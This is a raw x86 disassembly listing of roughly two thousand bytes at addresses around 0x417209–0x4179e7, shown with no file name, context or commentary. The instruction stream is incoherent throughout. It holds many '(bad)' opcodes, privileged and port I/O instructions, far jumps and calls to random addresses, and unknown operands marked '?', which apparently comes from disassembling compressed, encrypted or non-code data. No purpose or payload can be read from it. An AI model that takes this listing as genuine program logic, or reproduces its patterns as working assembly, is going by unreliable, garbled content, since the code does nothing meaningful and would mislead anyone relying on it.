  417209:	add    bh,BYTE PTR [ebx-0xe2834e6]
  41720f:	cs mov dh,0x4e
  417212:	das    
  417213:	rcl    DWORD PTR [edi+0x5ed02848],1
  417219:	xchg   ecx,eax
  41721a:	push   ds
  41721b:	dec    esi
  41721c:	int    0x76
  41721e:	mov    ebp,DWORD PTR [esi]
  417220:	popf   
  417221:	pop    ebx
  417222:	outs   dx,BYTE PTR ds:[esi]
  417223:	or     bh,dh
  417225:	ss cli 
  417227:	jg     0x417220
  417229:	rdmsr  
  41722b:	popa   
  41722c:	cmp    al,0x3
  41722e:	push   0x1b
  417230:	inc    esp
  417231:	or     al,0xac
  417233:	loope  0x4171bb
  417235:	mul    DWORD PTR [esp+ecx*2+0x25]
  417239:	sub    esp,edx
  41723b:	imul   esp,edi,0x89ad651a
  417241:	mov    eax,0x6023d7cc
  417246:	push   eax
  417247:	jmp    0x417202
  417249:	add    eax,0xa64602a9
  41724e:	call   0xcc8f8e80
  417253:	in     al,dx
  417254:	jo     0x41728d
  417256:	std    
  417257:	fcomp  QWORD PTR [ecx]
  417259:	cmp    eax,0xaeb27647
  41725e:	fbstp  TBYTE PTR [edx-0x7]
  417261:	pop    es
  417262:	dec    ebp
  417263:	or     DWORD PTR [ecx+0x35],ebp
  417266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417267:	(bad)  
  417268:	sub    BYTE PTR [ecx],ch
  41726a:	mov    esp,0xfaeafbce
  41726f:	sbb    BYTE PTR [eax-0x7c],al
  417272:	or     eax,DWORD PTR [ecx+0x415d7030]
  417278:	jbe    0x4172ac
  41727a:	int    0xea
  41727c:	jg     0x4171ff
  41727e:	jno    0x417200
  417280:	and    dh,ah
  417282:	inc    edi
  417283:	retf   0x676
  417286:	mov    bh,BYTE PTR [ebx+ebx*8+0x6b]
  41728a:	repz (bad) [eax]
  41728d:	add    ebx,esi
  41728f:	push   0x68dfb317
  417294:	stos   BYTE PTR es:[edi],al
  417295:	hlt    
  417296:	call   0xc397d466
  41729b:	test   al,0x42
  41729d:	daa    
  41729e:	out    dx,al
  41729f:	outs   dx,BYTE PTR ds:[esi]
  4172a0:	(bad)  
  4172a1:	xor    ch,BYTE PTR [eax+edi*1]
  4172a4:	adc    BYTE PTR [ebx-0x4b],bl
  4172a7:	cmp    ecx,DWORD PTR [edx+eiz*4]
  4172aa:	cmp    eax,0xe2a505eb
  4172af:	loop   0x417305
  4172b1:	bound  edx,QWORD PTR [eax+0x713cf09f]
  4172b7:	xchg   ebx,eax
  4172b8:	shl    esp,0x9
  4172bb:	inc    ebp
  4172bc:	mov    esi,0x8067b4b
  4172c1:	test   DWORD PTR [esi+0x9],esi
  4172c4:	jmp    FWORD PTR [ecx]
  4172c6:	xor    esi,DWORD PTR [ecx+0x23]
  4172c9:	inc    edx
  4172ca:	scas   eax,DWORD PTR es:[edi]
  4172cb:	icebp  
  4172cc:	clc    
  4172cd:	cmp    BYTE PTR [ebp+0x12c92d42],ah
  4172d3:	xor    DWORD PTR [edx],ecx
  4172d5:	pop    eax
  4172d6:	fs cld 
  4172d8:	xchg   ecx,eax
  4172d9:	arpl   WORD PTR [esi],cx
  4172db:	or     DWORD PTR ds:0x62271757,ebp
  4172e1:	std    
  4172e2:	mov    edx,0xd3424bf0
  4172e7:	mov    ch,0xa3
  4172e9:	je     0x4172c1
  4172eb:	mov    ebx,0x12ac41b2
  4172f0:	jmp    0x93e3c835
  4172f5:	xchg   ebp,eax
  4172f6:	fsubr  st,st(4)
  4172f8:	gs inc ecx
  4172fa:	retf   0x43da
  4172fd:	jl     0x4172a6
  4172ff:	loop   0x4172a9
  417301:	cdq    
  417302:	jle    0x41737e
  417304:	(bad)  
  417306:	sbb    ebp,DWORD PTR [ebp+0x63]
  417309:	pop    ss
  41730a:	pop    es
  41730b:	mov    bh,0x5c
  41730d:	push   cs
  41730e:	fs push esi
  417310:	cwde   
  417311:	sub    DWORD PTR [ecx+0x3c11398a],esp
  417317:	jg     0x417362
  417319:	outs   dx,BYTE PTR ds:[esi]
  41731a:	daa    
  41731b:	imul   edi,DWORD PTR [esi],0x96126f69
  417321:	push   eax
  417322:	and    al,0xc8
  417324:	imul   ebx,DWORD PTR [ecx],0xc9203fa4
  41732a:	jge    0x4172bc
  41732c:	add    BYTE PTR [esi+0x32],dh
  41732f:	imul   edi,edx,0xfffffff1
  417332:	inc    eax
  417333:	dec    eax
  417334:	jmp    edi
  417336:	popf   
  417337:	in     eax,0x46
  417339:	(bad)  
  41733a:	jle    0x4172fb
  41733c:	cmp    cl,BYTE PTR [ecx+0x40e1e127]
  417342:	aaa    
  417343:	jae    0x41739c
  417345:	sar    DWORD PTR [eax-0x525cd12a],cl
  41734b:	fstp   QWORD PTR [ebp+0x8]
  41734e:	jmp    0xaa81:0xdbfa99f0
  417355:	xor    eax,0x4729d836
  41735a:	push   eax
  41735b:	jo     0x4173d8
  41735d:	or     eax,0x3e9d5a5f
  417362:	jb     0x417377
  417364:	dec    eax
  417365:	mov    dl,0xa8
  417367:	out    0x10,eax
  417369:	pop    edx
  41736a:	lds    ebx,FWORD PTR [edi]
  41736c:	stos   DWORD PTR es:[edi],eax
  41736d:	pusha  
  41736e:	jge    0x417326
  417370:	lock dec ebp
  417372:	fs mov esp,0x9e37c09
  417378:	adc    DWORD PTR [ebx-0x7b],0x55
  41737c:	stos   BYTE PTR es:[edi],al
  41737d:	daa    
  41737e:	adc    al,0x22
  417380:	shl    DWORD PTR [esi],1
  417382:	in     eax,0x2a
  417384:	xchg   esp,eax
  417385:	mov    al,ds:0xfc3ebdb1
  41738a:	mov    BYTE PTR [ebp+0x22adeaf3],cl
  417390:	push   esp
  417391:	(bad)  
  417392:	inc    BYTE PTR es:[edi-0x4426a82d]
  417399:	mov    cl,0xe5
  41739b:	xchg   esp,eax
  41739c:	loope  0x41739f
  41739e:	popa   
  41739f:	inc    edx
  4173a0:	aaa    
  4173a1:	hlt    
  4173a2:	gs push ecx
  4173a4:	push   edx
  4173a5:	rcl    BYTE PTR [edx+0x3732d025],cl
  4173ab:	clc    
  4173ac:	add    eax,0xf9cdd79d
  4173b1:	adc    al,0x9
  4173b3:	push   ss
  4173b4:	loope  0x417336
  4173b6:	aad    0x29
  4173b8:	inc    ecx
  4173b9:	std    
  4173ba:	lea    esp,[eax+0x29]
  4173bd:	fsubrp st(7),st
  4173bf:	push   ds
  4173c0:	or     DWORD PTR [eax+0x7db92fec],ebx
  4173c6:	and    cl,dh
  4173c8:	sub    edx,ebp
  4173ca:	js     0x41741e
  4173cc:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4173ce:	aas    
  4173cf:	stc    
  4173d0:	outs   dx,BYTE PTR ds:[esi]
  4173d1:	(bad)  
  4173d2:	aaa    
  4173d3:	mov    eax,ds:0x494b18c
  4173d8:	and    eax,0x295732a7
  4173dd:	loop   0x417416
  4173df:	fsub   DWORD PTR [eax+0x76]
  4173e2:	cwde   
  4173e3:	out    dx,al
  4173e4:	gs inc esp
  4173e6:	pushf  
  4173e7:	dec    ecx
  4173e8:	sar    dl,0x37
  4173eb:	fnstenv [edx-0x40997fed]
  4173f1:	ror    ch,1
  4173f3:	mov    esp,0x55733a48
  4173f8:	xchg   DWORD PTR [edx+0x595928bc],edx
  4173fe:	or     ah,BYTE PTR [ebx*8-0x5a22541a]
  417405:	sbb    al,0x46
  417407:	jge    0x417419
  417409:	cmp    BYTE PTR [edx],cl
  41740b:	(bad)  
  41740c:	sahf   
  41740d:	inc    edx
  41740e:	cwde   
  41740f:	hlt    
  417410:	push   cs
  417411:	ins    DWORD PTR es:[edi],dx
  417412:	mov    ds:0x5fd49f4e,al
  417417:	inc    ecx
  417418:	fisttp DWORD PTR [edx+0x41]
  41741b:	sbb    eax,0xa3e96393
  417420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417421:	sub    bh,ah
  417423:	mov    ecx,?
  417425:	push   edi
  417426:	or     eax,0xa48c5013
  41742b:	fs mov ecx,0xaff0774
  417431:	fcomp  DWORD PTR [eax+ecx*1-0xf]
  417435:	loop   0x4173eb
  417437:	mov    ds:0x2f64de43,al
  41743c:	jmp    0x4174af
  41743e:	loop   0x417493
  417440:	sbb    DWORD PTR [edx+ebp*2-0x2c],0xf60c6336
  417448:	fst    DWORD PTR [esi-0x3c011092]
  41744e:	into   
  41744f:	inc    eax
  417451:	jmp    0x54ad:0xd417c073
  417458:	mov    DWORD PTR [ebp-0x7fd0586d],ebx
  41745e:	pop    esp
  41745f:	and    BYTE PTR [esi+0x70],al
  417462:	call   0x7063e4cb
  417467:	sbb    al,0x4a
  417469:	loop   0x41743b
  41746b:	stc    
  41746c:	(bad)  
  41746d:	into   
  41746e:	mov    ?,WORD PTR [edi]
  417470:	mov    bh,0xcd
  417472:	pop    eax
  417473:	in     al,dx
  417474:	cmp    eax,0xc1c30ccd
  417479:	test   eax,0x468bee3
  41747e:	pop    ebp
  41747f:	sub    eax,0xbb44f62e
  417484:	dec    esp
  417485:	stos   BYTE PTR es:[edi],al
  417486:	test   BYTE PTR [edx+0x23050cca],dl
  41748c:	cdq    
  41748d:	jnp    0x417474
  41748f:	jge    0x417473
  417491:	data16 repz jb 0x417495
  417495:	aam    0x64
  417497:	out    dx,al
  417498:	adc    BYTE PTR [ebp-0x1f330213],cl
  41749e:	imul   esi,DWORD PTR [edi+0x58],0x3446d027
  4174a5:	push   ecx
  4174a6:	clc    
  4174a7:	mov    DWORD PTR [ecx+edx*8+0x637a1167],esp
  4174ae:	jge    0x417474
  4174b0:	out    dx,eax
  4174b1:	push   cs
  4174b2:	xor    al,0x23
  4174b4:	pop    es
  4174b5:	add    edx,DWORD PTR [edx-0x7ba8f5fb]
  4174bb:	cld    
  4174bc:	dec    ebp
  4174bd:	fild   WORD PTR ds:0xbb357fef
  4174c3:	and    DWORD PTR [esi+0x28f23560],ebp
  4174c9:	xor    BYTE PTR [eax],0xc7
  4174cc:	lock js 0x41746b
  4174cf:	inc    ecx
  4174d0:	popa   
  4174d1:	gs (bad) 
  4174d3:	cmp    cl,BYTE PTR [edx]
  4174d5:	sti    
  4174d6:	daa    
  4174d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174d8:	and    BYTE PTR [ebx-0x3f],bl
  4174db:	sub    dh,BYTE PTR [eax-0x59]
  4174de:	mov    ebx,0x8ec0c3af
  4174e3:	sbb    dl,dl
  4174e5:	out    dx,al
  4174e6:	dec    ebx
  4174e7:	ficom  DWORD PTR [ebp-0x23]
  4174ea:	ret    
  4174eb:	mov    eax,ds:0xd653888d
  4174f0:	sbb    eax,0xb5fda008
  4174f5:	into   
  4174f6:	pusha  
  4174f7:	scas   al,BYTE PTR es:[edi]
  4174f8:	out    dx,al
  4174f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174fa:	dec    eax
  4174fb:	in     eax,0xe9
  4174fd:	ins    BYTE PTR es:[edi],dx
  4174fe:	les    edx,FWORD PTR ds:0x9443b295
  417504:	pop    es
  417505:	xchg   esi,eax
  417506:	xchg   cl,dh
  417508:	clc    
  417509:	jle    0x417560
  41750b:	add    eax,0x35da62f7
  417510:	cmp    DWORD PTR [edi],0xfffffff0
  417513:	add    ebx,ebx
  417515:	aas    
  417516:	cmp    edx,DWORD PTR [edx+eiz*8-0x4a]
  41751a:	fstp   TBYTE PTR [esi-0x56f9aaf8]
  417520:	mov    BYTE PTR [ecx],cl
  417522:	or     eax,0xc712fdf6
  417527:	jp     0x4174d9
  417529:	sub    ebx,0xa71842c6
  41752f:	fbstp  TBYTE PTR [ecx+0x6e]
  417532:	clc    
  417533:	cs scas eax,DWORD PTR es:[edi]
  417535:	jp     0x41750c
  417537:	fwait
  417538:	cmp    DWORD PTR [eax],edi
  41753a:	lahf   
  41753b:	mov    dl,0x47
  41753d:	je     0x41757c
  41753f:	js     0x4174d1
  417541:	sbb    edi,edi
  417543:	iret   
  417544:	push   ebx
  417545:	push   eax
  417546:	popa   
  417547:	clc    
  417548:	in     eax,dx
  417549:	cli    
  41754a:	fs scas eax,DWORD PTR es:[edi]
  41754c:	and    al,0x7e
  41754e:	sub    ecx,edx
  417550:	xchg   DWORD PTR [ebx+0x57],ebx
  417553:	in     eax,0xf0
  417555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417556:	mov    cl,0x10
  417558:	add    DWORD PTR [eax],0xd3d9f35a
  41755e:	es cmc 
  417560:	mov    eax,0x9d86dfd2
  417565:	sbb    al,0x5c
  417567:	icebp  
  417568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417569:	and    edx,esp
  41756b:	cdq    
  41756c:	cli    
  41756d:	scas   al,BYTE PTR es:[edi]
  41756e:	test   DWORD PTR [ebx-0x7faf8215],esp
  417574:	inc    ecx
  417575:	test   eax,0x8b37af1a
  41757a:	icebp  
  41757b:	sbb    BYTE PTR [edx-0x544255c1],bh
  417581:	pop    ss
  417582:	test   BYTE PTR [ecx+0x6db3134b],dh
  417588:	dec    eax
  417589:	inc    ebx
  41758a:	adc    cl,BYTE PTR [edi+0x7ab9b67a]
  417590:	mov    ds:0xcd46c877,al
  417595:	fld    TBYTE PTR [ebp-0x79307f7]
  41759b:	stos   BYTE PTR es:[edi],al
  41759c:	cmp    ecx,ebp
  41759e:	jge    0x417543
  4175a0:	mov    ch,0x92
  4175a2:	mov    eax,ds:0xb8dee2a
  4175a7:	jge    0x4175f0
  4175a9:	sub    eax,0xe53d5ba4
  4175ae:	or     DWORD PTR [edx+0x5e],edi
  4175b1:	mov    edi,0xbd0e7b74
  4175b6:	fist   WORD PTR [esi]
  4175b8:	inc    ebp
  4175b9:	dec    edx
  4175ba:	pop    edx
  4175bb:	and    DWORD PTR [ebx+esi*1-0xa0a5a94],ebp
  4175c2:	scas   al,BYTE PTR es:[edi]
  4175c3:	int    0xf5
  4175c5:	cmp    edi,ebx
  4175c7:	retf   
  4175c8:	(bad)  
  4175c9:	sahf   
  4175ca:	aam    0xc5
  4175cc:	inc    esi
  4175cd:	fcomp  DWORD PTR [ecx]
  4175cf:	mov    edi,ds
  4175d1:	xor    bh,ch
  4175d3:	lahf   
  4175d4:	lods   al,BYTE PTR ds:[esi]
  4175d5:	ficom  WORD PTR [ebx]
  4175d7:	aam    0x6d
  4175d9:	xchg   esp,eax
  4175da:	and    DWORD PTR [edi-0x4f],ebx
  4175dd:	hlt    
  4175de:	sbb    edi,DWORD PTR [ecx+0x6e]
  4175e1:	add    eax,0x58e8709
  4175e6:	dec    eax
  4175e7:	mov    ch,0x78
  4175e9:	cs jl  0x4175c3
  4175ec:	mov    ds:0xd6580250,al
  4175f1:	lods   eax,DWORD PTR ds:[esi]
  4175f2:	sbb    dh,al
  4175f4:	cwde   
  4175f5:	(bad)  
  4175f6:	loopne 0x4175fd
  4175f8:	dec    eax
  4175f9:	(bad)  [esi]
  4175fb:	imul   edx,DWORD PTR [ebx],0x73
  4175fe:	imul   ecx,DWORD PTR [esi-0x5cf40e31],0x28a4751b
  417608:	jne    0x4175cf
  41760a:	lahf   
  41760b:	dec    eax
  41760c:	loopne 0x41759c
  41760e:	xor    DWORD PTR [eax-0x1a36586e],esp
  417614:	ret    
  417615:	sbb    BYTE PTR [esi],dh
  417617:	push   cs
  417618:	mov    ds:0xb986ba48,eax
  41761d:	fs mov ch,0xb2
  417620:	jns    0x417630
  417622:	mov    ebp,0xac61d253
  417627:	inc    esp
  417629:	push   0xffffffb1
  41762b:	aas    
  41762c:	ret    0x1c4a
  41762f:	and    ecx,DWORD PTR [ecx+0xc]
  417632:	lock mov al,ds:0xbca6e28a
  417638:	or     BYTE PTR [edx+0x654024d],cl
  41763e:	lods   al,BYTE PTR ds:[esi]
  41763f:	idiv   ch
  417641:	fsubp  st(2),st
  417643:	sub    bh,bl
  417645:	dec    edx
  417646:	mov    ebx,0xfbbfc5c
  41764b:	gs push eax
  41764d:	out    0xa,al
  41764f:	jae    0x4175e8
  417651:	add    eax,0x33170f37
  417656:	inc    esp
  417657:	mov    dh,0x29
  417659:	std    
  41765a:	sub    BYTE PTR [eax+0x7f],ah
  41765d:	fwait
  41765e:	scas   eax,DWORD PTR es:[edi]
  41765f:	(bad)  
  417660:	xchg   esi,eax
  417661:	add    eax,0x890ffb03
  417666:	rcl    BYTE PTR [ebp-0x30],cl
  417669:	js     0x41764a
  41766b:	mov    dl,0xee
  41766d:	inc    ebp
  41766e:	dec    esp
  41766f:	cmp    ch,BYTE PTR [ebp*2-0x3c472e70]
  417676:	sub    BYTE PTR [ecx+0x2d7b499d],ch
  41767c:	adc    ch,BYTE PTR [ecx+0x1d]
  41767f:	call   0x1d5e7ff4
  417684:	dec    ebx
  417685:	ds pop ebp
  417687:	das    
  417688:	in     eax,dx
  417689:	xor    BYTE PTR [edx-0x29],bh
  41768c:	call   0xca4a:0x8d4d4ee7
  417693:	jmp    FWORD PTR [eax]
  417695:	xor    edx,DWORD PTR ds:0x92cbd7b4
  41769b:	mov    BYTE PTR [edx],dh
  41769d:	or     esp,0xffffffce
  4176a0:	addr16 aas 
  4176a2:	fstp   TBYTE PTR [edx-0x7]
  4176a5:	ds scas al,BYTE PTR es:[edi]
  4176a7:	cmp    esi,DWORD PTR [eax]
  4176a9:	push   es
  4176aa:	in     al,dx
  4176ab:	dec    esi
  4176ac:	outs   dx,DWORD PTR ds:[esi]
  4176ad:	mov    BYTE PTR [edi-0xb],ah
  4176b0:	pop    esp
  4176b1:	inc    esp
  4176b2:	xchg   ecx,eax
  4176b3:	jo     0x417730
  4176b5:	bound  ebx,QWORD PTR [ecx]
  4176b7:	scas   al,BYTE PTR es:[edi]
  4176b8:	nop
  4176b9:	xchg   ebx,eax
  4176ba:	mov    dl,al
  4176bc:	jl     0x4176eb
  4176be:	push   eax
  4176bf:	inc    ecx
  4176c0:	dec    esp
  4176c1:	pop    eax
  4176c2:	push   ebp
  4176c3:	and    ch,ch
  4176c5:	cmp    BYTE PTR ds:0xbd26a9b4,al
  4176cb:	sbb    BYTE PTR [ecx-0x19723d5e],0xd
  4176d2:	pusha  
  4176d3:	sti    
  4176d4:	(bad)  
  4176d5:	(bad)  
  4176d6:	leave  
  4176d7:	les    ebx,FWORD PTR [ecx]
  4176d9:	add    eax,0x3b22e5f7
  4176de:	mov    edx,0x96005bdc
  4176e3:	bound  ebp,QWORD PTR [ebp-0x5b8fd6c0]
  4176e9:	cmp    eax,0x1ee5838a
  4176ee:	adc    al,0x4b
  4176f0:	je     0x4176de
  4176f2:	jno    0x417694
  4176f4:	mov    WORD PTR [ebx-0x5e],?
  4176f7:	imul   edx,DWORD PTR [eax+0xb9401e8],0xffffffc2
  4176fe:	call   0xa3a:0x905e09
  417705:	in     eax,0x52
  417707:	sbb    DWORD PTR [eax+0x7d],ecx
  41770a:	xchg   ecx,eax
  41770b:	aas    
  41770c:	enter  0x6f89,0x1d
  417710:	fcomp  DWORD PTR ds:0xe263a2d5
  417716:	add    eax,0x89ffc093
  41771b:	not    BYTE PTR [edi-0x649032c2]
  417721:	lock in eax,0x59
  417724:	mov    ds:0xf7ebed62,eax
  417729:	add    eax,0x43777182
  41772e:	lea    esi,[ebp+0x19]
  417731:	rcr    DWORD PTR [edi-0x26],0xee
  417735:	push   ss
  417736:	or     ebp,esi
  417738:	adc    DWORD PTR [ebp+0xb],esi
  41773b:	pop    ds
  41773c:	lock outs dx,BYTE PTR ds:[esi]
  41773e:	cmp    eax,0xf643af2e
  417743:	popa   
  417744:	inc    esp
  417745:	jl     0x41773b
  417747:	and    DWORD PTR [edi+0xc],edi
  41774a:	mov    BYTE PTR [ebp-0xa8c852c],dh
  417750:	inc    esi
  417751:	bound  edi,QWORD PTR [edi-0x4081c212]
  417757:	cmp    ebx,0x11ed834b
  41775d:	lods   eax,DWORD PTR ds:[esi]
  41775e:	fisub  DWORD PTR [eax-0x5]
  417761:	outs   dx,DWORD PTR ds:[esi]
  417762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417763:	add    BYTE PTR [esi-0x2f],bl
  417766:	stc    
  417767:	cli    
  417768:	ret    0x6219
  41776b:	shl    BYTE PTR [edx],1
  41776d:	mov    es,ecx
  41776f:	sub    edx,DWORD PTR [esi]
  417771:	sub    al,0x7c
  417773:	sbb    dl,ah
  417775:	in     eax,0x5d
  417777:	cmp    DWORD PTR [esi+0x49b7782],ebp
  41777d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41777e:	or     DWORD PTR [ebp-0x9978dbc],esp
  417784:	xchg   DWORD PTR [edx-0x6a7e614f],eax
  41778a:	mov    ds:0xc59aaefa,al
  41778f:	push   cs
  417790:	push   ss
  417791:	pop    ebp
  417792:	mov    esi,0x8f9b6db3
  417797:	mov    ?,WORD PTR [ecx]
  417799:	outs   dx,BYTE PTR ds:[esi]
  41779a:	inc    eax
  41779b:	in     eax,0x34
  41779d:	ror    ebx,0x21
  4177a0:	xor    bl,ah
  4177a2:	mov    esi,0x25db8f0e
  4177a7:	jb     0x4177d2
  4177a9:	and    ecx,DWORD PTR [esi]
  4177ab:	dec    eax
  4177ac:	cdq    
  4177ad:	mov    gs,WORD PTR [ebp+0x2e]
  4177b0:	push   cs
  4177b1:	sub    eax,0x86a6bffd
  4177b6:	mov    al,0x27
  4177b8:	sbb    dh,BYTE PTR [edi-0x62ef140f]
  4177be:	adc    DWORD PTR [ecx-0x29],ebp
  4177c1:	fidivr DWORD PTR [edx+0x9]
  4177c4:	int    0x69
  4177c6:	cmp    BYTE PTR [ebx],ch
  4177c8:	add    ebp,DWORD PTR [esi+ebp*4-0x2a4e1d7b]
  4177cf:	call   0x82ae:0x9d2b0c81
  4177d6:	xor    ebx,DWORD PTR [eax+edx*4+0x72]
  4177da:	inc    ebx
  4177db:	add    eax,0xd91f00a8
  4177e0:	(bad)  
  4177e1:	scas   al,BYTE PTR es:[edi]
  4177e2:	call   0x6109:0x803f284
  4177e9:	pop    eax
  4177ea:	jbe    0x4177ee
  4177ec:	dec    esi
  4177ed:	(bad)  
  4177ee:	lds    esp,FWORD PTR cs:[ebp+0x44]
  4177f2:	add    bh,BYTE PTR [edi-0x5c75fe27]
  4177f8:	dec    edx
  4177f9:	cmc    
  4177fa:	add    al,0xf
  4177fc:	pop    ds
  4177fd:	inc    edx
  4177fe:	shl    DWORD PTR [ebp-0x43341886],0xd9
  417805:	fst    DWORD PTR [edi]
  417807:	adc    al,0xc0
  417809:	jecxz  0x417840
  41780b:	xchg   esp,eax
  41780c:	add    DWORD PTR [ebx],edx
  41780e:	pop    ds
  41780f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417810:	sbb    ch,BYTE PTR [esi-0x6e]
  417813:	into   
  417814:	adc    ecx,DWORD PTR [edi]
  417816:	xor    eax,0x7de76cb3
  41781b:	sbb    eax,0x435c5d5a
  417820:	dec    ebx
  417821:	sar    DWORD PTR [eax],0xb2
  417824:	mov    ch,0x4b
  417826:	lea    edx,[esi-0x10c0b11a]
  41782c:	mov    WORD PTR [ebx+0x2a38ecb7],?
  417832:	jbe    0x41787f
  417834:	call   FWORD PTR [esi+eiz*2+0x4f87c62c]
  41783b:	dec    edi
  41783c:	or     DWORD PTR [ebx-0xd],edx
  41783f:	mov    ds,WORD PTR [edx+0x41862f3d]
  417845:	mov    cl,0xe
  417847:	adc    ecx,DWORD PTR gs:[edx+0x173a386c]
  41784e:	push   edi
  41784f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417850:	int    0x23
  417852:	jae    0x4177f3
  417854:	fimul  DWORD PTR [edi]
  417856:	jle    0x417831
  417858:	ret    0x1b69
  41785b:	test   BYTE PTR [ebx+0x20304b4a],ch
  417861:	sub    ebx,ebx
  417863:	lds    edi,FWORD PTR [esi-0x5e]
  417866:	popf   
  417867:	cld    
  417868:	ret    
  417869:	xor    BYTE PTR [esi+ebp*8+0x6f],al
  41786d:	out    0x1,al
  41786f:	push   ss
  417870:	mov    edx,DWORD PTR [esi+ebx*4-0x4e24eaaa]
  417877:	push   ss
  417878:	icebp  
  417879:	mov    ds:0x4179a4af,al
  41787e:	or     dl,BYTE PTR [ebx-0x37]
  417881:	sub    eax,0x6874f9d3
  417886:	cmp    DWORD PTR [edx+0x16],0xffffffa9
  41788a:	xchg   ebp,eax
  41788b:	jle    0x4178e4
  41788d:	inc    esp
  41788e:	add    ebx,DWORD PTR [edx]
  417890:	pop    eax
  417891:	push   ecx
  417892:	inc    esp
  417893:	ss mov cl,0x86
  417896:	sbb    ecx,eax
  417898:	fnsave [edx]
  41789a:	loope  0x41790b
  41789c:	outs   dx,BYTE PTR ds:[esi]
  41789d:	(bad)  
  41789f:	mov    cl,0xf3
  4178a1:	les    esi,FWORD PTR [eax+eax*8]
  4178a4:	xor    eax,0xfd90777
  4178a9:	rcr    BYTE PTR [ebp+0x3f],0x99
  4178ad:	xchg   esp,eax
  4178ae:	enter  0x6af0,0x63
  4178b2:	int    0xba
  4178b4:	jae    0x417881
  4178b6:	push   edi
  4178b7:	dec    edx
  4178b8:	icebp  
  4178b9:	ss adc edx,edi
  4178bc:	in     al,0x23
  4178be:	mov    dl,0x28
  4178c0:	test   BYTE PTR [edx],cl
  4178c2:	pop    ecx
  4178c3:	adc    al,0x80
  4178c5:	mov    esp,0x4b7a5ddc
  4178ca:	test   al,0xeb
  4178cc:	and    al,0x2
  4178ce:	pop    esp
  4178cf:	data16 jnp 0x41792a
  4178d2:	ss xchg edx,eax
  4178d4:	retf   
  4178d5:	fdivr  st(7),st
  4178d7:	pop    ecx
  4178d8:	jb     0x417923
  4178da:	(bad)  
  4178db:	imul   esi,DWORD PTR [edi-0x6bc7abcd],0x6497b4c0
  4178e5:	jnp    0x417948
  4178e7:	xchg   ebx,eax
  4178e8:	add    al,0xdc
  4178ea:	loope  0x417960
  4178ec:	cmp    bl,BYTE PTR [ecx-0x3c]
  4178ef:	xchg   ebp,eax
  4178f0:	xor    ebp,ecx
  4178f2:	push   eax
  4178f3:	clc    
  4178f4:	pop    ebx
  4178f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f6:	sub    bl,al
  4178f8:	mov    edi,0x21c72631
  4178fd:	shr    DWORD PTR [ecx-0x27],1
  417900:	scas   al,BYTE PTR es:[edi]
  417901:	dec    esi
  417902:	or     eax,0x7564219c
  417907:	popa   
  417908:	mov    ebx,0x82e9ce51
  41790d:	cmp    BYTE PTR [ebp+0x5aad1d50],bh
  417913:	jmp    0x41797b
  417915:	les    ebx,FWORD PTR [eax+0x218badb5]
  41791b:	pushf  
  41791c:	mov    ah,0x52
  41791e:	test   BYTE PTR [ebp-0x5b464f17],0xb1
  417925:	or     cl,bh
  417927:	push   edx
  417928:	mov    esp,DWORD PTR ds:0x2c5f8cad
  41792e:	retf   0xfba2
  417931:	and    ah,BYTE PTR [eax]
  417933:	iret   
  417934:	inc    eax
  417935:	jne    0x417935
  417937:	retf   0xb41
  41793a:	retf   0xe569
  41793d:	popf   
  41793e:	and    eax,0xbc3ffe93
  417943:	xor    ebx,esi
  417945:	pop    ebp
  417946:	retf   
  417947:	clc    
  417948:	shl    BYTE PTR [edx],0x7e
  41794b:	mov    cs,WORD PTR [ecx+0x42]
  41794e:	aad    0xe5
  417950:	push   ebx
  417951:	ror    DWORD PTR [edi],1
  417953:	pop    edi
  417954:	jns    0x41798a
  417956:	or     cl,BYTE PTR [edi+0x525c9aa5]
  41795c:	fwait
  41795d:	jbe    0x4179b4
  41795f:	sbb    ch,BYTE PTR [edx+0x4c]
  417962:	cwde   
  417963:	push   ds
  417964:	jecxz  0x417968
  417966:	xlat   BYTE PTR ds:[ebx]
  417967:	outs   dx,DWORD PTR ds:[esi]
  417968:	add    eax,0xa6225a4
  41796d:	lea    esi,[ebx]
  41796f:	sbb    al,0x77
  417971:	push   ebp
  417972:	inc    ebp
  417973:	jmp    0x28a8:0x5fcde467
  41797a:	mov    eax,0x81b88521
  41797f:	out    dx,eax
  417980:	daa    
  417981:	xor    DWORD PTR [ebp-0x4c],eax
  417984:	mov    ebx,0xfae1042
  417989:	xchg   ebx,eax
  41798a:	sub    ecx,DWORD PTR [edi+0x28c6c355]
  417990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417991:	cld    
  417992:	adc    esp,ecx
  417994:	jne    0x41799f
  417996:	(bad)  
  417997:	adc    eax,DWORD PTR [ecx-0x5e6022d5]
  41799d:	mov    ecx,0xd3dfa394
  4179a2:	es aas 
  4179a4:	aam    0x71
  4179a6:	cmp    DWORD PTR [edi+0x14],edi
  4179a9:	test   al,0x22
  4179ab:	call   0x3950d685
  4179b0:	pop    DWORD PTR [edx+0x25]
  4179b3:	in     al,0xaa
  4179b5:	out    0xdc,al
  4179b7:	lahf   
  4179b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179b9:	aad    0x38
  4179bb:	cdq    
  4179bc:	fwait
  4179bd:	inc    esp
  4179be:	ret    0xe61
  4179c1:	dec    esi
  4179c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c3:	pusha  
  4179c4:	jmp    edi
  4179c6:	cli    
  4179c7:	xor    esp,eax
  4179c9:	dec    ebp
  4179ca:	call   0x9c4dcc40
  4179cf:	ss push es
  4179d1:	ret    0x2657
  4179d4:	stc    
  4179d5:	add    dl,ch
  4179d7:	pop    ds
  4179d8:	bnd lock ja 0x4179f8
  4179dc:	xchg   edi,eax
  4179dd:	clc    
  4179de:	or     bl,bl
  4179e0:	loope  0x417a3f
  4179e2:	push   esi
  4179e3:	sahf   
  4179e4:	add    al,0xaf
  4179e6:	xchg   ebp,eax
  4179e7:	or     eax,0x4d89ee15
